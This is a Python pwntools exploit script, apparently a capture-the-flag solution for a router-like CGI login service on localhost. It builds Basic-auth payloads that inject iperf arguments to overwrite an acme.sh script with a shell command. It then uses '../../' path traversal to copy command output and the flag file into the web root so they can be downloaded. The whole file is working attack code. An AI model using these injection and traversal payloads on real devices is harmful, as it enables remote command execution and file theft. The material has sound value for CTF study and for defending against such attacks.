# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 8889 ./babystack
#from more_itertools import one
from pwn import * # type: ignore
import os
import hashlib
import math
import socket
import base64

def batch_send(sock,payload,huge=0):
    if huge==1:
        sock.send=sock.write
    for i in range(0, len(payload),0x1000):
        if i+0x1000 < len(payload):
            sock.send(payload[i:i+0x1000])
        else:
            sock.send(payload[i:])

def build_http_req_str(method=b'POST',uri=b'',uri_arg=b'',post_arg=b'',host=b'', port=80,Content_Length=0,Authorization=b'',Content_Type=b'application/x-www-form-urlencoded'):
    payload = b"\r\n".join([
        b"%s %s%s HTTP/1.1" % (method,uri,uri_arg),
        b"Host: %s:%d" % (host, port), 
        b"Authorization: %s" % (Authorization),
        b"Content-Length: %d" % (Content_Length),
        b"Content-Type: %s" % (Content_Type),
        b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        b"Accept: */*",
        b"Accept-Language: en-US,en;q=0.5",
        b"Accept-Encoding: gzip, deflate, br",
        b"Connection: close",
        b"",
        b"%s" % (post_arg),
    ])
    return payload


def make_tcp_req(host,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1000.0)
    server_address = (host, port)
    print(f'Connecting to {server_address[0]} port {server_address[1]}')
    s.connect(server_address)
    return s

def send_payload_res(auth_payload):
    auth_payload = base64.b64encode(auth_payload)
    auth_payload = b'Basic '+auth_payload
    post_arg = b"id=abcdefghijklmnopqrstuvwx"
    payload = build_http_req_str(uri=b"/cgi-bin/login.cgi?login",host=host,port=port,Content_Length=len(post_arg),post_arg=post_arg,Authorization=auth_payload)
    #print(payload)
    sock=make_tcp_req(host,port)
    batch_send(sock,payload)
    response = sock.recv(0x1000)
    print('Received:', response.decode('utf-8'))
    sock.close()

def send_payload(auth_payload):
    auth_payload = base64.b64encode(auth_payload)
    auth_payload = b'Basic '+auth_payload
    post_arg = b"id=abcdefghijklmnopqrstuvwx"
    payload = build_http_req_str(uri=b"/cgi-bin/login.cgi?login",host=host,port=port,Content_Length=len(post_arg),post_arg=post_arg,Authorization=auth_payload)
    #print(payload)
    sock=make_tcp_req(host,port)
    batch_send(sock,payload)
    sock.close()


'''
    MODE_LOGIN = 1,
    MODE_RESET_PASSWORD = 2,
    MODE_REGISTER = 3,
    MODE_ADD_SESSION = 4,
    MODE_DEL_SESSION = 5,
    MODE_IPERFSERVER = 6,
    MODE_PING = 7,
    MODE_TRACEROUTE = 8,
    MODE_IPERFCLIENT = 9,
    MODE_GEN_CERT = 10,
    MODE_RENEW_CERT = 11,
    MODE_REVOKE_CERT = 12
'''
host = b'127.0.0.1'
port = 19980
def main():

    iperf_server = b'127.0.0.1'.rjust(0x7f,b'\x20') + b':' + b'22222' +b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00'+b'\x00'*(0x7f-5) + b'\x06'
    send_payload(iperf_server)

    iperf_client =  b'127.0.0.1'.rjust(0x7f,b'\x20') + b':' + b'22222 --logfile /root/.acme.sh/acme.sh -T "nohup ls / #"' +b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00' +b'\x00'*(0x7f-56) + b'\x09'
    send_payload_res(iperf_client)

    iperf_client =  b'127.0.0.1'.rjust(0x7f,b'\x20') + b':' + b'22222 --logfile /tmp/acme.sh.log -T "_on_issue_success"' +b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00' + b'\x00'*(0x7f-55)+ b'\x09'
    send_payload_res(iperf_client)
    cp_file = b'../../../../../root/.acme.sh/acme.sh' + b":" + b'../../../../../nohup.out #' + b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00' +b'\x00'*(0xfe-36-26) + b'\x0b'
    send_payload_res(cp_file)

    iperf_client =  b'127.0.0.1'.rjust(0x7f,b'\x20') + b':' + b'22222 --logfile /tmp/acme.sh.log -T "_on_issue_success"' +b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00' + b'\x00'*(0x7f-55)+ b'\x09'
    send_payload_res(iperf_client)
    echo_flag = b'g'.rjust(0x7f,b'g')+ b":" + b'h'.rjust(0x7f,b'g')+ b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00' + b'\x0b'
    send_payload_res(echo_flag)

    iperf_client =  b'127.0.0.1'.rjust(0x7f,b'\x20') + b':' + b'22222 --logfile /tmp/acme.sh.log -T "_on_issue_success"' +b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00' + b'\x00'*(0x7f-55)+ b'\x09'
    send_payload_res(iperf_client)
    cp_file = b'../../../../../nohup.out' + b":" + b'../../../../../var/www/html' + b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00' +b'\x00'*(0xfe-24-27) + b'\x0b'
    send_payload_res(cp_file)
    # then we can get the flag's name from http://localhost:19980/nohup.out

    iperf_client =  b'127.0.0.1'.rjust(0x7f,b'\x20') + b':' + b'22222 --logfile /tmp/acme.sh.log -T "_on_issue_success"' +b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00' + b'\x00'*(0x7f-55)+ b'\x09'
    send_payload_res(iperf_client)
    cp_file = b'../../../../../the_flaG_is_here056480436103548697634' + b":" + b'../../../../../var/www/html' + b':' + b'c'*0x7f+b':' + b'd'*(0x7f) +b'\x00' +b'\x00'*(0xfe-52-27) + b'\x0b'
    send_payload_res(cp_file)
    # then we can get the flag from http://localhost:19980/the_flaG_is_here056480436103548697634


if __name__ == "__main__":
    main()
